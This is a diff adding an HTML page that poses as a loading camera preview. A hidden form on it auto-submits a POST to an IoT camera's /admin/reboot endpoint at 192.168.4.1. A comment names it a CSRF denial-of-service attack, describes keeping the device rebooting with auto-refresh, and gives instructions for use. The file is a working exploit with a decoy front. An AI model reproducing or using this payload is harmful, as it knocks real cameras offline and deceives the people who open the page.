@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Loading camera preview...</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background: #1a1a1a;
+            color: #ccc;
+        }
+        .container {
+            text-align: center;
+            padding: 40px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>Loading camera stream...</h2>
+        <p>Connecting to device, please wait.</p>
+    </div>
+
+    <!--
+        CSRF Device Reboot Attack (Denial of Service)
+        ==============================================
+        This form auto-submits a POST to the IoT camera's /admin/reboot
+        endpoint, forcing an immediate device reboot.
+
+        Combined with auto-refresh (meta refresh or JS timer), this creates
+        a persistent denial-of-service: every time the device finishes
+        rebooting, the victim's browser reboots it again.
+
+        The device accepts the request because it performs no CSRF validation.
+
+        To use: open this page in a browser connected to the device's WiFi AP.
+        Default target: http://192.168.4.1
+    -->
+    <iframe name="csrf_target" style="display:none"></iframe>
+    <form id="csrf" action="http://192.168.4.1/admin/reboot" method="POST" target="csrf_target" style="display:none">
+    </form>
+
+    <script>
+        document.getElementById('csrf').submit();
+    </script>
+</body>
+</html>
